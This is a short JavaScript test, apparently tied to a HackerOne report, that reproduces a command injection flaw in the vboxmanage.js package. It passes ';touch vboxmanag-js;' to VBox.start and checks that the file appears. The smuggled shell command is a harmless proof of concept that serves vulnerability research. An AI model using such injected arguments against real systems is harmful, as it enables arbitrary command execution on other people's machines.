//https://hackerone.com/reports/864777
test("Command Injection in vboxmanage.js", () => {
  const VBox = require("vboxmanage.js");
  const fs = require("fs");
  const path = "./vboxmanag-js";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  VBox.start(";touch vboxmanag-js;")
    .then(function () {})
    .catch(function (err) {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
